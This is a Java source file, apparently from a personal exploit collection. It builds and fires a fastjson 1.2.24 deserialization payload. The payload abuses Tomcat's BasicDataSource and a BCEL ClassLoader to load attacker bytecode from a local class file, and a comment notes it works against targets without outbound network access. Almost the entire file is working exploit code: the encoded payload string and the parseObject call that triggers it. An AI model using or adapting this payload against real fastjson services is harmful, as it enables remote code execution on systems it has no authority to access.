package org.exploit.third.fastjson;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.nio.file.Files;
import java.nio.file.Paths;

//打不出网，本地加载字节码.need:TOMCAT8 TOMCAT9改为dbcp2
public class BCEL_parseObject_1_2_24 {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\Runtime_static.class"));
        String bcel = "\""+"$$BCEL$$"+Utility.encode(code,true)+"\"";
        //payload = {
        //              "@type":"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
        //              "driverClassLoader":{
        //                  "@type":"com.sun.org.apache.bcel.internal.util.ClassLoader",
        //              },
        //              "driverClassName":bcel
        //          }
        String payload = "{" +
                "\"@type\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\"," +
                "\"driverClassLoader\":{" +
                "\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"" +
                "}," +
                "\"driverClassName\":" + bcel +
                "}";
        System.out.println(payload);
        JSON.parseObject(payload);
    }
}
